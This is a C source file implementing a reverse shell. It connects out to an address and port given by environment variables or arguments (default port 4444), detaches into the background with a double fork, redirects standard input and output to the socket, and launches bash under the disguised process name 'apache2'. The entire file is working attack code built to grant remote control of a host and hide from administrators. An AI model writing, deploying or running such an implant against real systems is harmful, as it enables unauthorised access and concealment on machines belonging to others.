#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/tcp.h>
#include <netdb.h>
#include <limits.h>
#include <unistd.h>

#define _ERR_SOCKET -1
#define _ERR_RESOLV -1
#define _ERR_CONNECT -1
#define NO_ERRNO 0
#define ENV_VAR_NOT_FOUND NULL
#define _ERR_FORK -1
#define _ERR_SYSCONF -1
#define _DEFAULT_OPEN_MAX 1024
#define _FORK_SUCCESS 0
#define MAX_RETRIES_CONNECT 3

int
net_access (const char *restrict address, const char *restrict port)
{
  int sock = socket (AF_INET, SOCK_STREAM, 0);

  if (sock == _ERR_SOCKET)
    {
      perror ("[!] Error call socket failed with error ");
      return _ERR_SOCKET;
    }

  {
    struct addrinfo hints, *res;
    int errcode = 0;

    (void) memset (&hints, '\0', sizeof (struct addrinfo));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    errcode = getaddrinfo (address, port, &hints, &res);

    if (errcode)
      {
	int _errno = errno;
	(void) fprintf (stderr, "[!] Error, resolv (%s:%s) failed : %s\n",
			address, port, gai_strerror (errcode));
	close (sock);
	errno = _errno;
	return _ERR_RESOLV;
      }


    {
      int retries = MAX_RETRIES_CONNECT;
      (void) setsockopt (sock, IPPROTO_TCP, TCP_SYNCNT, &retries,
			 sizeof (retries));
    }

    for (struct addrinfo * cur = res; cur != NULL; cur = cur->ai_next)
      {
	if (connect (sock, cur->ai_addr, cur->ai_addrlen) != _ERR_CONNECT)
	  {
	    break;
	  }
      }

    if (errno != NO_ERRNO)
      {
	(void) fprintf (stderr, "[!] Error connect (%s:%s) failed :  %s\n",
			address, port, strerror (errno));
	(void) close (sock);
      }

    (void) freeaddrinfo (res);
  }

  return sock;
}



const char *
getargextend (size_t argc, char **argv, char *name_env, size_t pos,
	      const char *var_default)
{
  char *val = getenv (name_env);

  if (val == ENV_VAR_NOT_FOUND)
    {
      if (argc > pos)
	{
	  return (const char *) argv[pos];
	}
    }
  else
    return val;
  return var_default;
}

int
daemonize (int sock)
{
  int code_return = EXIT_SUCCESS;
  long max_open = sysconf (_SC_OPEN_MAX);

  if (max_open == _ERR_SYSCONF)
    {
      max_open = _DEFAULT_OPEN_MAX;
    }


  switch (fork ())
    {
    case 0:
      (void) setsid ();
      break;
    case _ERR_FORK:
      code_return = EXIT_FAILURE;
      exit (code_return);
      break;
    default:
      exit (code_return);
    }


  switch (fork ())
    {
    case 0:
      (void) chdir ("/");
      break;
    case _ERR_FORK:
      code_return = EXIT_FAILURE;
      exit (code_return);
      break;
    default:
      exit (code_return);
    }

  for (int fd = 0; fd < max_open; ++fd)
    {
      if (sock != fd)
	(void) close (fd);
    }

  (void) dup2 (sock, STDIN_FILENO);
  (void) dup2 (sock, STDOUT_FILENO);
  (void) dup2 (sock, STDERR_FILENO);

  if (sock != STDERR_FILENO && sock != STDOUT_FILENO && sock != STDERR_FILENO)
    close (sock);

  char *const envp[] = { "TERM=xterm-256color", "SHELL=bash" };
  (void) execle ("/bin/bash", /* XPTDR */ (const char *) "apache2",
		 (const char *) NULL, envp);
  exit (EXIT_FAILURE);
}



int
main (int argc, char **argv)
{
  const char *address;
  const char *port;
  int sock = 0;

  address = getargextend ((size_t) argc, argv, "ADDRESS", 1, "localhost");
  port = getargextend ((size_t) argc, argv, "PORT", 2, "4444");

  sock = net_access (address, port);
  if (sock == _ERR_SOCKET)
    {
      exit (EXIT_FAILURE);
    }

  daemonize (sock);

  return EXIT_SUCCESS;
}
